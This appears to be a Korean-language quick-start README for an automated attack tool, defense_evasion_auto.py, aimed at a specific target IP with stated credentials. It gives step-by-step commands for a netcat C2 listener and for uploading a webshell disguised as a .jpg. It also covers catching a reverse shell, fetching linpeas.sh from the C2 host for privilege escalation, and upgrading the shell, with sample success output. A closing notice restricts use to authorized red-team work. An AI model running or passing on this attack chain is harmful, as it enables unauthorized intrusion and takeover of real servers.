# 빠른 시작 가이드 - 방어 시스템 우회 공격

## ⚡ 5분 안에 시작하기

### 1단계: 준비 (1분)

```bash
# 1. 레포지토리 이동
cd /home/user/Red_basic_pro/H

# 2. 파이썬 패키지 설치
pip3 install requests beautifulsoup4 pillow

# 3. 스크립트 실행 권한
chmod +x defense_evasion_auto.py
```

### 2단계: C2 서버 리스너 시작 (1분)

**C2 서버 또는 공격자 서버에서:**

```bash
# 포트 4444에서 리스닝
nc -lvnp 4444

# 또는 tmux로 백그라운드 실행
tmux new -s listener
nc -lvnp 4444
# Ctrl+B, D로 나가기
```

### 3단계: 공격 실행 (3분)

**로컬 또는 오퍼레이터 서버에서:**

```bash
# 기본 사용법
python3 defense_evasion_auto.py 43.201.154.142 YOUR_C2_IP

# 예시
python3 defense_evasion_auto.py 43.201.154.142 57.181.28.7 --port 4444
```

**출력:**
```
╔═══════════════════════════════════════════════════════════╗
║  방어 시스템 우회 자동화 공격 도구                          ║
╚═══════════════════════════════════════════════════════════╝

[INFO] 1단계: 로그인 시도
[SUCCESS] ✓ 로그인 성공: alice

[INFO] 2단계: 웹쉘 업로드 (탐지 우회)
[SUCCESS] ✓ 웹쉘 업로드 성공: profile_1234.jpg

[INFO] 4단계: 리버스 쉘 배포
[SUCCESS] ✓ 리버스 쉘 페이로드 전송 완료

✓ 공격 성공!
```

### 4단계: 리버스 쉘 확보

**C2 서버에서 연결 확인:**

```bash
$ nc -lvnp 4444
Connection received on 43.201.154.142 52341

bash-4.2$ whoami
apache

bash-4.2$ hostname
ip-172-31-xx-xx
```

### 5단계: 권한 상승

```bash
# LinPEAS 실행 (C2 서버에서 호스팅 중이면)
wget http://C2_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 또는 빠른 SUID 체크
find / -perm -4000 -type f 2>/dev/null

# Root 권한 획득 후
whoami
# root
```

---

## 📝 필수 정보

### 대상 서버
- **IP:** 43.201.154.142 (스크립트 인자로 전달)
- **로그인:** alice / alice2024
- **포트:** 80 (HTTP)

### 공격자 인프라
- **C2 서버:** 제공된 IP 사용
- **리다이렉터:** 57.181.28.7 (선택 사항)
- **오퍼레이터:** 52.192.8.114 (선택 사항)

### 포트
- **4444:** 리버스 쉘 (기본)
- **8000:** HTTP 서버 (페이로드 호스팅)

---

## 🎯 주요 명령어

### 공격 실행

```bash
# 기본
python3 defense_evasion_auto.py TARGET_IP C2_IP

# 포트 지정
python3 defense_evasion_auto.py TARGET_IP C2_IP --port 4444

# 로그인 정보 변경
python3 defense_evasion_auto.py TARGET_IP C2_IP \
    --username alice --password alice2024

# 리다이렉터 사용
python3 defense_evasion_auto.py TARGET_IP C2_IP \
    --redirector REDIRECTOR_IP

# 모든 옵션
python3 defense_evasion_auto.py TARGET_IP C2_IP \
    --port 4444 \
    --username alice \
    --password alice2024 \
    --c2 C2_IP \
    --redirector REDIRECTOR_IP
```

### C2 서버

```bash
# 리스너
nc -lvnp 4444

# 페이로드 호스팅
cd /opt/payloads
python3 -m http.server 8000

# tmux 사용
tmux new -s c2
nc -lvnp 4444
# Ctrl+B, D
```

### 리버스 쉘

```bash
# TTY 업그레이드
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg

# 정찰
whoami
id
uname -a
sudo -l

# 권한 상승
find / -perm -4000 -type f 2>/dev/null
./linpeas.sh
```

---

## 🚨 문제 해결

### 로그인 실패
```bash
# 인증 정보 확인
--username alice --password alice2024

# 5분 대기 (IP 차단 해제)
sleep 300
```

### 웹쉘 업로드 실패
```bash
# 수동 테스트
curl -X POST http://TARGET/upload.php \
    -F "file=@shell.jpg" \
    -b "PHPSESSID=..."
```

### 리버스 쉘 연결 안됨
```bash
# 방화벽 확인
sudo ufw allow 4444/tcp

# AWS 보안 그룹
# Inbound TCP 4444 허용

# 다른 포트 시도
--port 443
```

---

## 📚 추가 문서

### 상세 가이드
- **DEFENSE_EVASION_GUIDE.md** - 전체 공격 가이드
- **C2_INFRASTRUCTURE_GUIDE.md** - C2 인프라 설정
- **ATTACK_CHAIN_EXPLAINED.md** - 공격 원리 설명

### 기존 시스템
- **README_START_HERE.md** - 권한 상승 가이드
- **QUICK_COMMANDS.txt** - 명령어 모음
- **fin/최종_사용_가이드.md** - 완성된 공격 예시

---

## 🎓 학습 경로

### 초급 (처음 사용)
1. ✅ 이 문서 (QUICK_START.md)
2. ✅ 스크립트 실행
3. ✅ 리버스 쉘 획득

### 중급 (이해 심화)
1. DEFENSE_EVASION_GUIDE.md 읽기
2. 방어 시스템 분석
3. 수동 공격 시도

### 고급 (전문가)
1. C2_INFRASTRUCTURE_GUIDE.md
2. 다층 인프라 구축
3. 고급 우회 기법 (HTTPS, DNS 터널 등)

---

## ⚠️ 법적 고지

이 도구는 **승인된 레드팀 활동** 및 **침투 테스트**에만 사용하세요.

✅ **허용:**
- 서면 승인을 받은 침투 테스트
- 레드팀 훈련 (승인된 환경)
- CTF 대회
- 보안 연구 및 교육

🚫 **금지:**
- 무단 침입
- 불법 해킹
- 개인정보 탈취

**불법 사용 시 법적 처벌 대상입니다.**

---

## 📞 지원

### 문제 발생 시
1. **트러블슈팅 섹션** 확인
2. **DEFENSE_EVASION_GUIDE.md** 트러블슈팅 챕터
3. 로그 확인: `attack_report_*.json`

### 참고 자료
- OWASP: https://owasp.org/
- GTFOBins: https://gtfobins.github.io/
- HackTricks: https://book.hacktricks.xyz/

---

**버전:** 1.0
**작성일:** 2025-01-14
**목적:** 빠른 시작 가이드

**🎯 해피 해킹! (합법적으로만)**
